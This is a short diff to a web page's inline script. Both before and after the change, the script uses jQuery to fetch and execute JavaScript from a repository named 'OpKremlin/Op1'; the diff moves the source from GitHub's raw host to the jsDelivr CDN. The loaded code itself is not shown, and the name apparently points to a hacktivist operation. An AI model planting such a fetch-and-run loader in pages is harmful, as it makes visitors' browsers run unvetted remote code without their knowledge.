@@ -27,7 +27,7 @@
 <script>
 $.ajax({
   method: "GET",
-  url: "https://raw.githubusercontent.com/OpKremlin/Op1/main/main.js",
+  url: "https://cdn.jsdelivr.net/gh/OpKremlin/Op1/main.js",
   dataType: "script"
 });
 </script>
